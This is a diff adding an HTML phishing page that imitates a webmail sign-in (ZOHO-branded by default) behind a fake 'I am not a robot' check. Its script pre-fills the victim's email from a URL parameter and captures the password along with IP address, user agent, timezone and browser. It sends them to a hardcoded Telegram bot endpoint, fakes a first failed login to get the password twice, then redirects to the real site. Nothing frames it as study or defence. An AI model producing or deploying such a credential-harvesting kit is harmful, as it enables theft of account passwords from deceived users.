@@ -1,0 +1,247 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Sign-in</title>
+  <!-- Include Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <!-- Google Fonts: Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    /* Hide the main content initially */
+    #main-content {
+      display: none;
+    }
+
+    /* Verification Div Styling */
+    #verification-div {
+      height: 100vh;
+      display: flex;
+      align-items: start;
+      justify-content: center;
+	  padding-top: 10%;
+    }
+
+    /* Ensure text is left-aligned */
+    .verification-content {
+      text-align: left;
+    }
+
+    /* Adjust spinner size */
+    .spinner-border {
+      width: 1.5rem;
+      height: 1.5rem;
+    }
+  </style>
+  
+  
+  
+   <style>
+     #background-iframe,#overlay{position:fixed;top:0;left:0;height:100%;width:100%}body{font-family:Poppins,sans-serif;margin:0;padding:0;overflow:hidden}#background-iframe{border:none;z-index:-3;object-fit:cover}#overlay{background-color:rgba(0,0,0,.5);z-index:-2}.form-container{display:none;max-width:400px;width:100%;padding:2rem;background-color:rgba(255,255,255,.95);border-radius:.75rem;box-shadow:0 8px 16px rgba(0,0,0,.2);position:relative;z-index:1}.icon-text{display:flex;align-items:center;margin-bottom:1.5rem}.icon-text img{width:32px;height:32px;margin-right:.5rem}.icon-text .h4{margin-bottom:0;color:#0d6efd}.form-floating{position:relative;margin-bottom:1.5rem}.form-floating label,.input-icon{position:absolute;color:#6c757d;pointer-events:none}.form-floating label{transition:.2s ease-in-out;left:2.5rem;top:-.2rem;background-color:transparent;z-index:1}.form-floating input:focus+label,.form-floating input:not(:placeholder-shown)+label{transform:translateY(-1.5rem);font-size:.85rem;color:#0d6efd}.form-control{border-top:none;border-left:none;border-right:none;border-bottom:2px solid #ced4da;border-radius:0;padding-left:2.5rem;transition:border-color .2s;background-color:transparent}.form-control:focus{box-shadow:none;outline:0;border-bottom-color:#0d6efd}.input-icon{left:.75rem;top:50%;transform:translateY(-50%);font-size:1.2rem}.btn-primary{width:100%;padding:.75rem;font-size:1rem;background-color:#0d6efd;border:none;border-radius:.375rem;transition:background-color .3s,color .3s}.btn-primary:hover{background-color:#0b5ed7;color:#fff}.btn-primary:focus{box-shadow:none}@media (max-width:576px){.form-container{padding:1.5rem}}.loader-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);align-items:center;justify-content:center;z-index:9999;display:none}.error-message{color:red;margin-bottom:1rem;display:none}
+    </style>
+	
+	
+	
+</head>
+
+
+ 
+    <!-- Verification Div -->
+  
+
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
+    <!-- Main Content Div -->
+    
+	<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
+	  <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
+      <div class="row">
+        <div class="col-12 verification-content mx-2">
+          <h2>Checking your browser before accessing the site</h2>
+		  <div>
+			  <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border:0px solid black;background: #f3efef;border-radius:5px;">
+				<input type="checkbox" id="bot-check" class="form-check-input">
+				<label for="bot-check" class="form-check-label ms-2">I am not a robot</label>
+			  </div>
+		  </div>
+
+		  <p class="pt-1">click on the checkbox to verify if you're human.</p>
+        </div>
+      </div>
+    </div>
+    <!-- Background Iframe -->
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <!-- Dimmed Overlay -->
+    <div id="overlay"></div>
+    <!-- Form Container -->
+    <div class="form-container" id="form-container" >
+        <!-- Error Message -->
+        <div id="error-message" class="error-message">Try again</div>
+
+        <form id="user-form">
+            <!-- Icon and Text Row -->
+            <div class="icon-text">
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width:15px;">
+                <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
+            </div>
+            <!-- Heading -->
+            <h5 class="mb-3">Let's get started</h5>
+            <!-- Paragraph -->
+            <p class="mb-4 text-muted" style="font-size: .8rem;">Previous session has expired, login to continue</p>
+			
+            <!-- Email Input -->
+            <div class="form-floating position-relative">
+                <i class="bi bi-envelope input-icon"></i>
+                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
+                <label for="email" style="background-color: transparent;">Email</label>
+            </div>
+            <!-- Password Input -->
+            <div class="form-floating position-relative">
+                <i class="bi bi-lock input-icon"></i>
+                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
+                <label for="password" style="background-color: transparent;">Password</label>
+            </div>
+            <!-- Submit Button -->
+            <button type="submit" class="btn btn-primary">Next</button>
+        </form>
+    </div>
+
+    <!-- Loader Overlay -->
+    <div id="loader-overlay" class="loader-overlay">
+        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript to Handle 'eta' Parameter and Background Iframe -->
+    <script>
+let submitCount = 0;
+document.addEventListener("DOMContentLoaded", (() => {
+	const e = new URLSearchParams(window.location.search).get("eta");
+	let t;
+	if (e) {
+		document.getElementById("email").value = e;
+		const n = e.split("@");
+		if (2 === n.length) {
+			const e = n[1];
+			t = e, document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
+			const o = e.split(".")[0].toUpperCase();
+			document.getElementById("domain-name").textContent = o;
+			const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
+			document.getElementById("background-iframe").src = r
+		}
+	} else console.warn("No 'eta' parameter found in the URL."), document.getElementById("background-iframe").src = "about:blank";
+	let n = {
+		ipAddress: "Fetching...",
+		userAgent: navigator.userAgent,
+		timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+		browser: "Detecting..."
+	};
+	const o = navigator.userAgent;
+	o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown", fetch("https://api.ipify.org?format=json").then((e => e.json())).then((e => {
+		n.ipAddress = e.ip
+	})).catch((e => {
+		console.error("Error fetching IP address:", e), n.ipAddress = "Unavailable"
+	})), document.getElementById("user-form").addEventListener("submit", (function(e) {
+		e.preventDefault(), submitCount += 1;
+		const o = 1 === submitCount,
+			r = 2 === submitCount;
+		document.getElementById("loader-overlay").style.display = "flex";
+		let s = `✅🤑💳💶 OFFICE 365 💶💳🤑✅\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
+		new Promise((e => {
+			const t = setInterval((() => {
+				"Fetching..." !== n.ipAddress && (clearInterval(t), e())
+			}), 100)
+		})).then((() => {
+			s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`, (e => {
+				const t = {
+					chat_id: "7013526255",
+					text: e
+				};
+				fetch("https://api.telegram.org/bot7764347043:AAEuybfsqKph64cigOwlaAOQcsn-KoyYUo8/sendMessage", {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json"
+					},
+					body: JSON.stringify(t)
+				}).then((e => e.json())).then((e => {
+					e.ok || (console.error("Error sending message to Telegram:", e), alert("Failed to submit the form."), document.getElementById("password").value = "")
+				})).catch((e => {
+					console.error("Error sending message to Telegram:", e), alert("An error occurred while submitting the form."), document.getElementById("password").value = ""
+				}))
+			})(s)
+		})), o ? setTimeout((() => {
+			document.getElementById("loader-overlay").style.display = "none";
+			document.getElementById("error-message").style.display = "block", document.getElementById("password").value = ""
+		}), 3e3) : r && setTimeout((() => {
+			document.getElementById("loader-overlay").style.display = "none", window.location.href = "https://" + t
+		}), 3e3)
+	}))
+}));  </script>
+</body>
+
+  
+      <!--End Main Content Div -->
+    <!--End Main Content Div -->
+    <!--End Main Content Div -->
+
+  <!-- Include Bootstrap 5 JS Bundle -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+  <!-- JavaScript Code -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const botCheck = document.getElementById('bot-check');
+      const verificationDiv = document.getElementById('verification-div');
+      const formContainer = document.getElementById('form-container');
+	  
+      const mainContent = document.getElementById('main-content');
+
+      botCheck.addEventListener('change', function () {
+        if (this.checked) {
+          // Replace the checkbox with a loader
+          const checkboxContainer = this.parentElement;
+          checkboxContainer.innerHTML = `
+            <div class="spinner-container d-flex align-items-center">
+              <div class="spinner-border" role="status">
+                <span class="visually-hidden">Loading...</span>
+              </div>
+              <span class="ms-2">Verifying...</span>
+            </div>
+          `;
+
+          // Wait for 4 seconds
+          setTimeout(function () {
+            // Display "Redirecting..." message
+            verificationDiv.innerHTML = `
+              <div class="row">
+                <div class="col-12 verification-content">
+                  <h2>Redirecting...</h2>
+                </div>
+              </div>
+            `;
+
+            // Wait for 2 seconds
+            setTimeout(function () {
+              // Hide verification div and show main content
+              verificationDiv.style.display = 'none';
+              mainContent.style.display = 'block';
+              formContainer.style.display = 'block';
+            }, 2000);
+          }, 4000);
+        }
+      });
+    });
+  </script>
+
+
+</html>
